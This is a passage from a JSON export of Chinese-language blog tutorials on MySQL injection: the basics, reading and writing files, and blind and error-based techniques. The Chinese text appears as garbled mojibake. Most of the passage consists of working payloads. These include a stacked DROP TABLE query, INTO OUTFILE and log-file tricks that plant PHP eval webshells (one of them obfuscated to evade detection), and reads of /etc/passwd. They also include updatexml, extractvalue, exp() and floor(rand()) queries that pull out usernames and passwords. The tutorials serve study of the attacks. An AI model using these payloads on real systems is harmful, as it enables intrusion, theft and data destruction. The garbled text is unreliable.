admin çš„å¯†ç äº† Piggy-backed/Chained ä¸ UNION ç±»ä¼¼ï¼Œ Piggy-backed/Chained ä¹Ÿæ˜¯ä¸ºäº†æ‰§è¡Œé¢å¤–çš„è¯­å¥ åˆ©ç”¨ ; æ¥å¢åŠ é¢å¤–çš„è¯­å¥å®ç° \u0026lt;?php $q = \u0026#34;SELECT id FROM users WHERE user=\u0026#39;\u0026#34;.$user. \u0026#34;\u0026#39; AND pass=\u0026#39;\u0026#34;.$pass.\u0026#34;\u0026#39;\u0026#34;; ?\u0026gt;\u0026lt;?php $user = \u0026#34;\u0026#39;; DROP TABLE users âˆ’âˆ’ \u0026#34;; ?\u0026gt;æœ€ç»ˆå˜æˆ SELECT id FROM utente WHERE user=\u0026#39;\u0026#39;; DROP TABLE users --\u0026#34;\u0026#39; AND pass=\u0026#39;\u0026#39; Blind injection è¯¦è§ SQLæ³¨å…¥ï¼šç›²æ³¨   å¸ƒå°”ç›²æ³¨\nå¸ƒå°”Boolï¼Œæ„å‘³ç€æˆ‘ä»¬åœ¨å°†æ³¨å…¥ä¸€äº›å¸ƒå°”é€»è¾‘åˆ¤æ–­ï¼Œæ¥æŸ¥çœ‹é¡µé¢æ˜¯å¦å‘ç”Ÿå˜åŒ–æ¥åˆ¤æ–­è¯­å¥æ˜¯å¦æˆåŠŸæ‰§è¡Œï¼Œæ¯”å¦‚ï¼šå¦‚æœæˆåŠŸï¼Œåˆ™é¡µé¢æ­£å¸¸æ˜¾ç¤ºï¼Œå¦åˆ™å°±ä»€ä¹ˆéƒ½ä¸æ˜¾ç¤º     æŠ¥é”™æ³¨å…¥\næŠ¥é”™æ³¨å…¥æ˜¯å°†æœ‰ä»·å€¼çš„ä¿¡æ¯é€šè¿‡æŠ¥é”™çš„æ–¹å¼æ˜¾ç¤ºè¾“å‡ºã€‚ è¿™é‡Œéœ€è¦ä¸æ™®é€šçš„æ³¨å…¥åŒºåˆ†ä¸€ä¸‹ï¼š  æ™®é€šçš„æ³¨å…¥æ˜¯å°†æŸ¥è¯¢åˆ°çš„ä¿¡æ¯è¿”å›å‡ºæ¥  æŠ¥é”™æ³¨å…¥æ˜¯æ„é€ ç‰¹å®šçš„MYSQLå‡½æ•°è¯­æ³•é”™è¯¯ï¼ŒåŒæ—¶å°†æ‰€éœ€è¦çš„ä¿¡æ¯æ‹¼æ¥åˆ°é”™è¯¯è¿”å›ä¿¡æ¯ä¸­ï¼Œç„¶åå†è¿”å›åˆ°é¡µé¢ä¸Šæ¥       å»¶æ—¶æ³¨å…¥\næ—¶é—´ç›²æ³¨æ˜¯ä¸€ç§è¾¹ä¿¡é“æ”»å‡»(Side-channel attack SCA)ï¼ŒåŸæœ¬æ˜¯å¯†ç å­¦çš„ä¸€ä¸ªæ¦‚å¿µï¼Œè¿™ç§æ”»å‡»ç”¨äºåŠ å¯†ç®—æ³•çš„ç ´è§£ï¼Œå®ƒåŸºäºå¯†ç ç³»ç»Ÿçš„ç‰©ç†å®ç°è€Œä¸æ˜¯åŠ å¯†ç®—æ³•å…¶æœ¬èº«ï¼Œæ¯”å¦‚åŠ å¯†æ‰€éœ€è¦çš„æ—¶é—´ï¼Œæ‰€æ¶ˆè€—çš„ç”µå­è®¾å¤‡çš„ä¸€åˆ‡èµ„æºï¼Œç”šè‡³ç”µç£æ³„éœ²æˆ–è€…å£°éŸ³è¿™äº›ä¿¡æ¯æ¥åè¿‡æ¥åˆ†æç®—æ³•æœ¬èº«ã€‚ä¸ªäººè®¤ä¸ºSCAçš„ä¸€ä¸ªç‰¹ç‚¹ï¼Œå°±æ˜¯è¦åˆ»æ„æ‰©å¤§ä¸€ä¸ªæ­£å¸¸çš„æ“ä½œçš„å½±å“ï¼Œä»¥æ­¤åˆ¶é€ æ˜æ˜¾çš„ç‰¹å¾ã€‚ é‚£ä¹ˆåœ¨æ—¶é—´ç›²æ³¨ä¸­ï¼Œæˆ‘ä»¬æ— æ³•åƒä¸åŒæ³¨å…¥é‚£æ ·ï¼Œå¾—åˆ°æŸ¥è¯¢çš„æ•°æ®ï¼Œä¹Ÿæ— æ³•é€šè¿‡å¸ƒå°”ç›²æ³¨æˆ–è€…æŠ¥é”™ç›²æ³¨åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºçš„è·å¾—ä»»ä½•ä¿¡æ¯ï¼Œè€Œæ˜¯é€šè¿‡é€šè¿‡åˆ¤æ–­è¯­å¥ï¼ŒåŒæ—¶å¢åŠ æˆåŠŸæ³¨å…¥æ‰€ä½¿ç”¨çš„æ—¶é—´ï¼Œé€šè¿‡ä¸åŒæ‹¼æ¥è¯­å¥æ‰€éœ€è¦çš„æ—¶é—´æ¥åˆ¤æ–­æ˜¯å¦æˆåŠŸæ‰§è¡Œã€‚   æ–‡ä»¶è¯»å†™æ³¨å…¥ è¯¦è§ SQLæ³¨å…¥ï¼šæ–‡ä»¶è¯»å†™   è¯»\nåˆ©ç”¨Mysqlå†…ç½®çš„ç”¨äºè¯»å–æ–‡ä»¶çš„å‡½æ•°æ¥è¯»å–æ–‡ä»¶å†…å®¹     å†™\nä¸€èˆ¬çš„åˆ©ç”¨å°±æ˜¯å°†ä¸€å¥è¯æœ¨é©¬æ³¨å…¥åˆ°æœåŠ¡ç«¯ï¼Œç„¶åå†ç”¨èšå‰‘ç­‰å·¥å…·è¿æ¥   å…¶ä»–ä¸€äº›ç»•è¿‡å§¿åŠ¿ å¯¹MYSQLæ³¨å…¥ç›¸å…³å†…å®¹åŠéƒ¨åˆ†Trickçš„å½’ç±»å°ç»“ ","date":"2022-04-24T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/sql_injection_basic/","title":"SQLæ³¨å…¥ï¼šåŸºç¡€"},{"content":"SQLæ³¨å…¥ï¼šæ–‡ä»¶è¯»å†™ ä¹‹å‰æˆ‘ä»¬çš„åŸºç¡€æ³¨å…¥åŒ…æ‹¬ç›²æ³¨éƒ½ä¾èµ–äºHTTPè¯·æ±‚çš„å“åº”ï¼Œå¹¶ä»å…¶ä¸­è·å–æŸ¥è¯¢ç»“æœï¼ŒæŠ¥é”™ä¿¡æ¯ï¼Œé¡µé¢å˜åŒ–ï¼Œä»¥åŠå“åº”æ—¶é—´ï¼Œè€Œè¿™æ¬¡æˆ‘ä»¬è¦è®²çš„æ–‡ä»¶è¯»å†™åˆ™æ˜¯ç›´æ¥å°†éœ€è¦çš„ä¿¡æ¯å†™å…¥æ–‡ä»¶ï¼Œæˆ–è€…ä»æ–‡ä»¶ä¸­è¯»å–ä¿¡æ¯ã€‚\nå‚è€ƒï¼š https://xz.aliyun.com/t/7169#toc-33\nå‰ç½®çŸ¥è¯† è¯´åˆ°æ–‡ä»¶è¯»å†™ï¼Œé‚£å°±å…ä¸äº†è¦æåˆ°æƒé™çš„é—®é¢˜ã€‚\n  file_priv æ˜¯ç”¨æˆ·è¯»å†™æ–‡ä»¶çš„æƒé™ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹payloadæ¥æŸ¥è¯¢æƒé™\nselectfile_privfrommysql.userwhereuser=$USERhost=$HOST;   secure-file-priv æ˜¯ç³»ç»Ÿå˜é‡ï¼Œç”¨ä»¥å¯¹æ–‡ä»¶è¯»å†™åŠŸèƒ½è¿›è¡Œé™åˆ¶ï¼š\n ä¸ºç©ºï¼Œè¡¨ç¤ºæ— é™åˆ¶ ä¸ºNULLï¼Œè¡¨ç¤ºç¦æ­¢æ–‡ä»¶è¯»å†™ ä¸ºç›®å½•åï¼Œè¡¨ç¤ºå°†æ–‡ä»¶è¯»å†™é™åˆ¶åœ¨ç‰¹å®šç›®å½•ä¸‹    æ³¨ï¼š5.5.53æœ¬èº«åŠä¹‹åçš„ç‰ˆæœ¬é»˜è®¤å€¼ä¸ºNULLï¼Œä¹‹å‰çš„ç‰ˆæœ¬ä¸ºç©º\næŸ¥çœ‹ secure-file-priv å€¼çš„æ–¹æ³•\nselect@@secure_file_priv;select@@global.secure_file_priv;showvariableslike\u0026#34;secure_file_priv\u0026#34;;secure_file_priv= (ç©ºæ ¼ï¼‰ä»£è¡¨å¯¹æ–‡ä»¶è¯»å†™æ²¡æœ‰é™åˆ¶ secure_file_priv=NULL ä»£è¡¨ä¸èƒ½è¿›è¡Œæ–‡ä»¶è¯»å†™ secure_file_priv=d:/â€¦ (å…·ä½“è·¯å¾„) ä»£è¡¨åªèƒ½å¯¹æ”¹è·¯å¾„ä¸‹æ–‡ä»¶è¿›è¡Œè¯»å†™\nä¿®æ”¹çš„æ–¹æ³• :\né€šè¿‡ä¿®æ”¹my.iniæ–‡ä»¶ï¼Œæ·»åŠ ï¼š secure-file-priv=\nå¯åŠ¨é¡¹æ·»åŠ å‚æ•°ï¼š mysqld.exe --secure-file-priv=\nå†™ ä¸€èˆ¬çš„åˆ©ç”¨å°±æ˜¯å°†ä¸€å¥è¯æœ¨é©¬æ³¨å…¥åˆ°æœåŠ¡ç«¯ï¼Œç„¶åå†ç”¨èšå‰‘ç­‰å·¥å…·è¿æ¥\nselect1,\u0026#34;\u0026lt;?php @eval($_POST[\u0026#39;t\u0026#39;]);?\u0026gt;\u0026#34;intooutfile\u0026#39;/var/www/html/1.php\u0026#39;;select2,\u0026#34;\u0026lt;?php @assert($_POST[\u0026#39;t\u0026#39;]);?\u0026gt;\u0026#34;intodumpfile\u0026#39;/var/www/html/1.php\u0026#39;; éœ€è¦æ»¡è¶³çš„æ¡ä»¶  secure-file-priv ä¸ºç©ºæˆ–ä¸ºå¯ä»¥åˆ©ç”¨çš„ç›®å½• éœ€è¦ç›®æ ‡æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ ç›®æ ‡ç›®å½•çš„æƒé™ä¸ºå¯å†™ï¼Œmysqlçš„æƒé™ä¹Ÿè¶³å¤Ÿ    æ—¥å¿—æ³• å‚è€ƒ ç”±äºåœ¨mysqlçš„5.5.53ç‰ˆæœ¬ä¹‹åï¼Œ secure-file-priv çš„å€¼é»˜è®¤ä¸º NULL (NULLä¸ç­‰äºç©º)ï¼Œä¸æ»¡è¶³æˆ‘ä»¬æ‰€éœ€è¦çš„æ¡ä»¶ï¼Œæ— æ³•è¿›è¡Œæ­£å¸¸çš„è¯»å†™ã€‚ è¿™é‡Œæˆ‘ä»¬é€šè¿‡æ›´æ”¹æ—¥å¿—æ–‡ä»¶çš„æ–¹æ³•æ¥è¿›è¡Œç»•è¿‡\nshowvariableslike\u0026#39;%general%\u0026#39;;#æŸ¥çœ‹é…ç½®setglobalgeneral_log=on;#å¼€å¯generallogæ¨¡å¼setglobalgeneral_log_file=\u0026#39;/var/www/html/1.php\u0026#39;;#è®¾ç½®æ—¥å¿—ç›®å½•ä¸ºshellåœ°å€select\u0026#39;\u0026lt;?php eval($_POST[cmd]);?\u0026gt;\u0026#39;#å†™å…¥shellSQLæŸ¥è¯¢å…æ€shell\nSELECT\u0026#34;\u0026lt;?php $p = array(\u0026#39;f\u0026#39;=\u0026gt;\u0026#39;a\u0026#39;,\u0026#39;pffff\u0026#39;=\u0026gt;\u0026#39;s\u0026#39;,\u0026#39;e\u0026#39;=\u0026gt;\u0026#39;fffff\u0026#39;,\u0026#39;lfaaaa\u0026#39;=\u0026gt;\u0026#39;r\u0026#39;,\u0026#39;nnnnn\u0026#39;=\u0026gt;\u0026#39;t\u0026#39;);$a = array_keys($p);$_=$p[\u0026#39;pffff\u0026#39;].$p[\u0026#39;pffff\u0026#39;].$a[2];$_= \u0026#39;a\u0026#39;.$_.\u0026#39;rt\u0026#39;;$_(base64_decode($_REQUEST[\u0026#39;username\u0026#39;]));?\u0026gt;\u0026#34;æ…¢æŸ¥è¯¢æ—¥å¿—\nmysql\u0026gt;setglobalslow_query_log_file=\u0026#39;/var/www/html/2.php\u0026#39;mysql\u0026gt;setglobalslow_query_log=1; éœ€è¦æ»¡è¶³çš„æ¡ä»¶  éœ€è¦è¿›è¡Œæ—¥å¿—è®¾ç½®æ“ä½œçš„æƒé™ éœ€è¦ç›®æ ‡æ–‡ä»¶çš„ç»å¯¹è·¯å¾„    è¯» https://paper.seebug.org/1112/ Mysqlå†…ç½®äº†ç”¨äºè¯»å–æ–‡ä»¶çš„å‡½æ•°ï¼š\nselectload_file(file_path);è¯»å–æœåŠ¡ç«¯æ–‡ä»¶ï¼ŒMysql serverè¯»å–æœåŠ¡ç«¯çš„ /etc/passwd/ æ–‡ä»¶ï¼Œç„¶åå°†æ•°æ®æŒ‰ç…§ '\\n' åˆ†å‰² æ’å…¥testè¡¨ä¸­ï¼Œä½†æ˜¯å—åˆ° secure_file_priv çš„é™åˆ¶\nloaddatainfile\u0026#34;/etc/passwd\u0026#34;intotabletestFIELDSTERMINATEDBY\u0026#39;\\n\u0026#39;;è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶ï¼Œè¯»å–å®¢æˆ·ç«¯çš„æ–‡ä»¶ï¼Œç„¶åå‘é€åˆ°å®¢æˆ·ç«¯\nloaddatalocalinfile\u0026#34;/etc/passwd\u0026#34;intotabletestFIELDSTERMINATEDBY\u0026#39;\\n\u0026#39;; æ¡ä»¶  è¯»å–æœåŠ¡ç«¯æ–‡ä»¶éƒ½éœ€è¦ secure-file-priv ä¸ºç©ºæˆ–è€…ä¸ºå¯åˆ©ç”¨çš„ç›®å½• éœ€è¦çŸ¥é“è¯»å–æ–‡ä»¶æ‰€åœ¨çš„ç»å¯¹è·¯å¾„ è¯»å–çš„æ–‡ä»¶å¤§å°å¿…é¡»å°äº max_allowed_packet æ‰€è®¾ç½®çš„å€¼    ä½æƒé™è¯»å–æ–‡ä»¶çš„æ–¹æ³• æˆ‘ä»¬åœ¨å‰ç½®çŸ¥è¯†ä¸­æåˆ°äº†5.5.53ç‰ˆæœ¬ä¹‹åï¼Œ secure-file-priv é»˜è®¤ä¸º NULL è¿™é‡Œç»™å‡ºæ–¹æ³•ï¼Œå‚è€ƒæ–‡ç« æåˆ°mysql8æµ‹è¯•å¤±è´¥ï¼Œå…¶ä»–ç‰ˆæœ¬è‡ªæµ‹\ndroptablemysql.m1;CREATETABLEmysql.m1(codeTEXT);LOADDATALOCALINFILE\u0026#39;D://1.txt\u0026#39;INTOTABLEmysql.m1fieldsterminatedby\u0026#39;\u0026#39;;select*frommysql.m1;","date":"2022-04-02T00:00:00+01:00","permalink":"https://ginkgo.org.cn/posts/sql_injection_file_rw/","title":"SQLæ³¨å…¥ï¼šæ–‡ä»¶è¯»å†™"},{"content":"\u0026lt;!\u0026ndash;more\u0026ndash;\u0026gt;\nSQL Injection: Blind injection å¯¹äºä¹‹å‰çš„SQLæ³¨å…¥ï¼Œæˆ‘ä»¬éƒ½æ˜¯é€šè¿‡æ³¨å…¥æ‹¼æ¥æŸ¥è¯¢è¯­å¥ï¼Œæ¥æ˜¾ç¤ºçš„è¿”å›æ•°æ®åº“ï¼Œè¡¨ï¼Œåˆ—çš„ä¿¡æ¯åˆ°é¡µé¢å¯¹åº”çš„ä½ç½®ï¼Œè€Œç›²æ³¨çš„ç‰¹ç‚¹å°±åœ¨äºé¡µé¢ä¸ä¼šè¿”å›æŸ¥è¯¢çš„å†…å®¹ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›æ ‡å¿—æˆ–è€…è¯´ä¿¡å·ï¼ˆsignalï¼‰æ¥å¾—çŸ¥æ³¨å…¥è¯­å¥æ˜¯å¦è¢«æ‰§è¡Œ\n1. å¸ƒå°”ç›²æ³¨ æˆ‘ä»¬å…ˆæ¥ä»‹ç»å¸ƒå°”ç›²æ³¨ï¼Œå¸ƒå°”Boolï¼Œæ„å‘³ç€æˆ‘ä»¬åœ¨å°†æ³¨å…¥ä¸€äº›å¸ƒå°”é€»è¾‘åˆ¤æ–­ï¼Œæ¥æŸ¥çœ‹é¡µé¢æ˜¯å¦å‘ç”Ÿå˜åŒ–æ¥åˆ¤æ–­è¯­å¥æ˜¯å¦æˆåŠŸæ‰§è¡Œï¼Œæ¯”å¦‚ï¼šå¦‚æœæˆåŠŸï¼Œåˆ™é¡µé¢æ­£å¸¸æ˜¾ç¤ºï¼Œå¦åˆ™å°±ä»€ä¹ˆéƒ½ä¸æ˜¾ç¤º\næ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹ä¸€äº›ç”±ä¸åŒçš„å‡½æ•°ç»„æˆçš„å¸ƒå°”åˆ¤æ–­\n- left() é€šè¿‡leftæ¥æˆªå–å­—ç¬¦ï¼Œç„¶åä½¿ç”¨å­—æ¯è¡¨è¿›è¡Œé€ä¸ªæ¯”è¾ƒï¼Œå¦‚æœç­‰å¼æˆç«‹ï¼Œé‚£ä¹ˆé¡µé¢æ­£å¸¸æ˜¾ç¤ºï¼Œå¦‚æœå¤±è´¥ï¼Œé‚£ä¹ˆé¡µé¢å°±æ— æ³•æ­£å¸¸æ˜¾ç¤ºï¼Œä»¥æ­¤æˆ‘ä»¬å°±å¯ä»¥æ¨æ–­å­—ç¬¦ä¸²çš„å†…å®¹\n?id=1\u0026#39; and left(database(), 1)\u0026gt;\u0026#39;a\u0026#39; # database first char match ?id=1\u0026#39;andleft(database(),2)\u0026gt;\u0026#39;se\u0026#39;#databasefirsttwocharsmatchå¯ä»¥å…ˆé€šè¿‡lengthæ¥åˆ¤æ–­é•¿åº¦ï¼Œæ–¹ä¾¿è¿›è¡Œ\n?id=1\u0026#39;and length(database())=8%23 # length match - substr() ascii() åŒæ ·æ˜¯æˆªå–å­—ç¬¦ï¼Œä½¿ç”¨substræ–¹æ³•ï¼Œç„¶åé€šè¿‡asciiè½¬æ¢æˆasciiç åè¿›è¡Œæ¯”è¾ƒ\nascii(substr((selecttable_namefrominformation_schema.tableswheretables_schema=database()limit0,1),1,1))=101- ORD() and MID() ä¸substr()å’Œascii()çš„ç»„åˆç±»ä¼¼ï¼Œä¹Ÿæ˜¯é€šè¿‡MIDé€ä¸ªé€‰å–å­—ç¬¦ï¼Œç„¶åä½¿ç”¨ORDè¿”å›ASCIIè¿›è¡Œæ¯”è¾ƒ\n?id=1\u0026#39;and ORD(MID((select IFNULL(CAST(username as char), 0x20) from security.users order by id limit 0,1),1,1))=68 # match username\u0026#39;sfirstrecordbyIFNULL- regexp è¿™æ¬¡æ˜¯åˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥è¿›è¡Œæ¯”è¾ƒ\n?id=1\u0026#39; and 1=(select 1 from information_schema.columns where table_name=\u0026#39;users\u0026#39; and table_name regexp \u0026#39;^[a-z]\u0026#39; limit 0,1)-- - ?id=1\u0026#39;and1=(select1frominformation_schema.columnswheretable_name=\u0026#39;users\u0026#39;andcolumn_nameregexp\u0026#39;^username\u0026#39;limit0,1)-- - - like åŒ¹é…æ³¨å…¥ é€šè¿‡æ¨¡ç³ŠåŒ¹é…æ¥è¿›è¡Œæ¯”è¾ƒ\nselectuser()like\u0026#39;ro%\u0026#39; The percent sign (%) represents zero, one, or multiple characters The underscore sign (_) represents one, single character  2. æŠ¥é”™ç›²æ³¨ æŠ¥é”™æ³¨å…¥æ˜¯å°†æœ‰ä»·å€¼çš„ä¿¡æ¯é€šè¿‡æŠ¥é”™çš„æ–¹å¼æ˜¾ç¤ºè¾“å‡ºã€‚ è¿™é‡Œéœ€è¦ä¸æ™®é€šçš„æ³¨å…¥åŒºåˆ†ä¸€ä¸‹ï¼š\n æ™®é€šçš„æ³¨å…¥æ˜¯å°†æŸ¥è¯¢åˆ°çš„ä¿¡æ¯è¿”å›å‡ºæ¥ æŠ¥é”™æ³¨å…¥æ˜¯æ„é€ ç‰¹å®šçš„MYSQLå‡½æ•°è¯­æ³•é”™è¯¯ï¼ŒåŒæ—¶å°†æ‰€éœ€è¦çš„ä¿¡æ¯æ‹¼æ¥åˆ°é”™è¯¯è¿”å›ä¿¡æ¯ä¸­ï¼Œç„¶åå†è¿”å›åˆ°é¡µé¢ä¸Šæ¥  https://blog.sari3l.com/posts/9622f295/#/procedure-analyse\n - BigIntæ•°æ®ç±»å‹æº¢å‡ºæŠ¥é”™æ³¨å…¥ https://www.freebuf.com/articles/web/274019.html\nåˆ©ç”¨exp(int)å‡½æ•°ï¼Œè®¡ç®—e^[int]çš„å€¼ï¼Œå¾—åˆ°ä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œç›®çš„æ˜¯è¦é€ æˆ\u0026quot;DOUBLE value is out of range\u0026quot;çš„é”™è¯¯ åªé€‚ç”¨äºï¼Œ mysqlç‰ˆæœ¬5.5.5ä»¥ä¸Šçš„ç‰ˆæœ¬\n?id=1\u0026#39; and exp(~(select * from (select user())a))-- - 1.å…ˆæŸ¥è¯¢select user()è¿™ä¸ªè¯­å¥çš„ç»“æœï¼Œç„¶åå°†æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®ä½œä¸ºä¸€ä¸ªç»“æœé›†å–åä¸ºa 2.ç„¶ååœ¨æŸ¥è¯¢select * from a æŸ¥è¯¢aï¼Œå°†ç»“æœé›†aå…¨éƒ¨æŸ¥è¯¢å‡ºæ¥ 3.æŸ¥è¯¢å®Œæˆï¼Œè¯­å¥æˆåŠŸæ‰§è¡Œï¼Œè¿”å›å€¼ä¸º0ï¼Œå°†0æŒ‰ä½å–åï¼ˆ\u0026rsquo;~\u0026rsquo;ï¼‰å°±ä¼šå¾—åˆ°ä¸€ä¸ªæ— ç¬¦å·çš„æœ€å¤§BIGINTå€¼ï¼Œä»è€Œä½¿expè°ƒç”¨çš„æ—¶å€™æŠ¥é”™\nè·å–è¡¨åä¿¡æ¯\nandexp(~(select*from(selecttable_namefrominformation_schema.tableswheretable_schema=database()limit0,1)a))-- - è·å–åˆ—åä¿¡æ¯\nandexp(~(select*from(selectcolumn_namefrominformation_schema.columnswheretable_name=\u0026#39;users\u0026#39;limit0,1)a))-- - è·å–åˆ—åå¯¹åº”çš„ä¿¡æ¯\nandexp(~(select*from(selectusernamefromuserslimit0,1)a))-- - è¯»å–æ–‡ä»¶\nandexp(~(select*from(selectload_file(\u0026#39;/etc/passwd\u0026#39;))a))-- - æ³¨æ„ï¼šå¯¹äºæ‰€æœ‰çš„insertã€updateå’Œdeleteè¯­å¥DIOSæŸ¥è¯¢ä¹ŸåŒæ ·å¯ä»¥ä½¿ç”¨ é™¤äº†exp()å‡½æ•°ä¹‹å¤–ï¼Œpow()ä¹‹ç±»çš„ç›¸ä¼¼å‡½æ•°åŒæ ·å¯ä»¥åˆ©ç”¨BigIntæ•°æ®æº¢å‡ºçš„æ–¹å¼è¿›è¡ŒæŠ¥é”™æ³¨å…¥\n- å‚æ•°æ ¼å¼é”™è¯¯ å‚æ•°æ ¼å¼é”™è¯¯æ—¨åœ¨ä½¿ç”¨ç‰¹æ®Šçš„å‡½æ•°ï¼Œè¿™äº›å‡½æ•°éœ€è¦å‚æ•°æ»¡è¶³ä¸€å®šçš„æ¡ä»¶ï¼Œå¦åˆ™å°†ä¼šæŠ¥å‡ºé”™è¯¯çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬é€šè¿‡å°†éœ€è¦çš„å†…å®¹æŸ¥è¯¢ä¹‹åæ‹¼æ¥åˆ°æŠ¥å‡ºçš„é”™è¯¯ä¿¡æ¯ä¸­æ¥å®ç°æŠ¥é”™æ³¨å…¥\n  (1) updatexml()\nupdatexml() å‡½æ•°åˆ©ç”¨çš„å°±æ˜¯mysqlå‡½æ•°å‚æ•°æ ¼å¼é”™è¯¯è¿›è¡ŒæŠ¥é”™æ³¨å…¥\nupdatexml() å‡½æ•°è¯­æ³•ï¼šupdatexml(XML_document,Xpath_string,new_value);\nå‡½æ•°è¯­æ³•è§£æï¼š\nXML_document:æ˜¯å­—ç¬¦ä¸²Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡åç§°\nXpath_string:Xpathæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼šboostore, bookstore/book, /book, bookstore//book, //@lang, /[/@\\d]\nnew_value:stringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®\né€‚ç”¨ç‰ˆæœ¬æ˜¯ï¼š Mysql 5.1.5+\nåˆ©ç”¨æ–¹å¼ï¼šåœ¨æ‰§è¡Œä¸¤ä¸ªå‡½æ•°æ—¶ï¼Œå¦‚æœå‡ºç°xmlæ–‡ä»¶è·¯å¾„é”™è¯¯ï¼Œå°±ä¼šäº§ç”ŸæŠ¥é”™ é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ„é€ Xpath_stringæ ¼å¼é”™è¯¯ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å°†Xpath_stringçš„å€¼ä¼ é€’æˆä¸ç¬¦åˆæ ¼å¼çš„å‚æ•°ï¼Œmysqlå°±ä¼šæŠ¥é”™\næŸ¥è¯¢å½“å‰æ•°æ®åº“çš„ç”¨æˆ·ä¿¡æ¯ä»¥åŠæ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯\n?id=1\u0026#39; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3)-- - æ ¹æ®ä¸Šé¢å¯¹äºXpath_stringçš„å®šä¹‰æˆ‘ä»¬å¯ä»¥å¾—çŸ¥ï¼Œå½“ä½¿ç”¨ç±»ä¼¼0x7e=\u0026rsquo;~\u0026lsquo;ä¹‹ç±»çš„é¢å¤–å­—ç¬¦çš„æ—¶å€™ï¼Œä¼šè¢«è®¤å®šä¸ºéXpathï¼Œå°±ä¼šäº§ç”ŸæŠ¥é”™\n æŸ¥è¯¢å½“å‰æ•°æ®åº“åç§°åŠæ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ï¼š\n?id=1\u0026#39; and updatexml(1,concat(0x7e,database(),0x7e,@@version_compile_os,0x7e),3)-- - è·å–å½“å‰æ•°æ®åº“ä¸‹æ•°æ®è¡¨ä¿¡æ¯ï¼š\n?id=1\u0026#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3)-- - ä¸ºå•¥ä¸å¯ä»¥ï¼Ÿ\n?id=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),3)-- - æ³¨æ„ : updatexmlæœ€å¤šåªèƒ½æ˜¾ç¤º32ä½ï¼Œéœ€è¦é…åˆSUBSTRä½¿ç”¨\n    (2) extractvalue()\nå‡½æ•°è¯­æ³•:extractvalue(XML_document,XPath_string)\né€‚ç”¨çš„ç‰ˆæœ¬ï¼š5.1.5+\nåˆ©ç”¨çš„åŸç†ä¹Ÿæ˜¯xpathæ ¼å¼ä¸ç¬¦æŠ¥é”™æ³¨å…¥\nè·å–å½“å‰æ˜¯æ•°æ®åº“åç§°åŠä½¿ç”¨mysqlæ•°æ®åº“çš„ç‰ˆæœ¬ä¿¡æ¯ï¼š\nandextractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e))-- - è·å–å½“å‰æ³¨å…¥ç‚¹çš„ç”¨æˆ·æƒé™ä¿¡æ¯åŠæ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ï¼š\nandextractvalue(1,concat(0x7e,@@version_compile_os,0x7e,user(),0x7e))-- - è·å–å½“å‰ä½ç½®æ‰€ç”¨æ•°æ®åº“çš„ä½ç½®ï¼š\nandextractvalue(1,concat(0x7e,@@datadir,0x7e))-- - è·å–æ•°æ®è¡¨ä¿¡æ¯:\nandextractvalue(1,concat(0x7e,(selecttable_namefrominformation_schema.tableswheretable_schema=database()limit0,1),0x7e))-- - è·å–usersæ•°æ®è¡¨çš„åˆ—åä¿¡æ¯:\nandextractvalue(1,concat(0x7e,(selectcolumn_namefrominformation_schema.columnswheretable_name=\u0026#39;users\u0026#39;limit0,1),0x7e))-- - è·å–å¯¹åº”çš„åˆ—åçš„ä¿¡æ¯(username\\password):\nandextractvalue(1,concat(0x7e,(selectusernamefromuserslimit0,1),0x7e))-- -   - ä¸»é”®é‡å¤ https://www.freebuf.com/articles/web/242986.html ä¸»é”®é‡å¤æ— è®ºæ˜¯ç†è§£å’Œè§£é‡Šéƒ½æ¯”è¾ƒå¤æ‚ï¼Œæˆ‘ä»¬å…ˆç»™å‡ºå¸¸ç”¨çš„payloadï¼Œç„¶åæ…¢æ…¢ç»†è¯´\nselectcount(*)fromusersgroupbyconcat(database(),floor(rand(14)*2));selectcount(*),concat(database(),floor(rand(14)*2))xfromusersgroupbyx;æˆ‘ä»¬ä½¿ç”¨sali-labsçš„ç¯å¢ƒï¼Œå› æ­¤è¿™é‡Œçš„database()çš„å€¼å°±æ˜¯security ä»¥ä¸Špayloadçš„æŠ¥é”™å°±æ˜¯ï¼š\n æˆ‘ä»¬è§‚å¯Ÿåˆ°è¿™é‡Œæç¤ºæœ‰\u0026rsquo;security0\u0026rsquo;ä¸»é”®é‡å¤,è¿™é‡Œæ€è€ƒå‡ ä¸ªé—®é¢˜ï¼Œ1ï¼‰securityåé¢çš„0æ˜¯å“ªé‡Œæ¥çš„ï¼Ÿ2ï¼‰ä¸»é”®æ˜¯å“ªé‡Œæ¥çš„ï¼Ÿ3ï¼‰ä¸ºä»€ä¹ˆä¼šå‘ç”Ÿä¸»é”®é‡å¤ï¼Ÿ4ï¼‰ä¸ºä»€ä¹ˆrandçš„seedæ˜¯14ï¼ˆä¸€èˆ¬çœ‹åˆ°çš„å¯èƒ½å°±æ˜¯0ï¼‰\n  (1) securityåé¢çš„0æ˜¯å“ªé‡Œæ¥çš„ï¼Ÿ\né€šè¿‡ floor(rand(14)*2) æ„é€ 